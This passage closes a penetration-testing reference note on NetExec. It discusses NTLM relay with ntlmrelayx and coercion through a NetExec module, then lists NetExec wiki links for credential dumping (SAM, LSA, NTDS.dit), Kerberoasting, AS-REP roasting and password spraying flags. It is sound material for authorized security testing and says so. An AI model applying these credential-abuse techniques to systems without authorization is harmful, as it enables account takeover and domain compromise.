- **ntlmrelayx (impacket)** — this is what the Phase-1 `signing:False` finding *feeds*. Hosts without SMB signing are relay targets; `netexec ... -M coerce_plus` can force an authentication callback, and ntlmrelayx catches and relays it. Relaying is an active credential-abuse technique with real blast radius — red-team / explicitly-authorized engagements only, never on a silent VDP. Report the `signing:False` exposure on its own merits first; demonstrate a relay chain only when the rules cover it.

For the pre-fork command grammar and the handful of modules that never migrated, see the [[crackmapexec]] note — NetExec is the maintained successor, the module tree lives in the NetExec repository, and new work should target `nxc`, not the archived `cme`.

---

## References

- NetExec Wiki — https://www.netexec.wiki/
- NetExec Wiki, Using Credentials (spraying, `--jitter`, `--no-bruteforce`, `--continue-on-success`) — https://www.netexec.wiki/getting-started/using-credentials
- NetExec Wiki, Logging (`--log`, nxc.conf `log_mode`) — https://www.netexec.wiki/getting-started/log-your-results
- NetExec Wiki, Checking Credentials — Local (`--local-auth`) — https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-local
- NetExec Wiki, Obtaining Credentials (Dump SAM / LSA / NTDS.dit) — https://www.netexec.wiki/smb-protocol/obtaining-credentials
- NetExec Wiki, Dump NTDS.dit (`--ntds`, `vss`/`drsuapi`, `--user`, `--enabled`) — https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit
- NetExec Wiki, Enumerate Null Sessions (`-u '' -p ''`) — https://www.netexec.wiki/smb-protocol/enumeration/enumerate-null-sessions
- NetExec Wiki, Kerberoasting (`--kerberoasting`, `--targeted-kerberoast`, `--no-preauth-targets`) — https://www.netexec.wiki/ldap-protocol/kerberoasting
- NetExec Wiki, ASREPRoast (`--asreproast`) — https://www.netexec.wiki/ldap-protocol/asreproast
- NetExec Wiki, BloodHound Ingestor (`--bloodhound --collection`) — https://www.netexec.wiki/ldap-protocol/bloodhound-ingestor
- `nxc smb --help` dump (flags/defaults: `-t` default 256, `--timeout`, `--smb-timeout` default 2, `--jitter`, `--log`, `--sam [{secdump,regdump}]`, `--lsa`, `--ntds [{vss,drsuapi}]`, `--shares`, `--laps`, `--pass-pol`, `--rid-brute`) — https://kb.offsec.nl/tools/framework/netexec/nxc-smb/
- NetExec GitHub, issue #280 "Add output format flag" (closed as not planned — no json/grepable/markdown) — https://github.com/Pennyw0rth/NetExec/issues/280
- NetExec GitHub repository — https://github.com/Pennyw0rth/NetExec

*Research supplement added 2026-11-16, grounded in the NetExec wiki (netexec.wiki), the `nxc smb --help` reference at kb.offsec.nl, and NetExec GitHub issue #280 (model: claude-opus-4-8).*
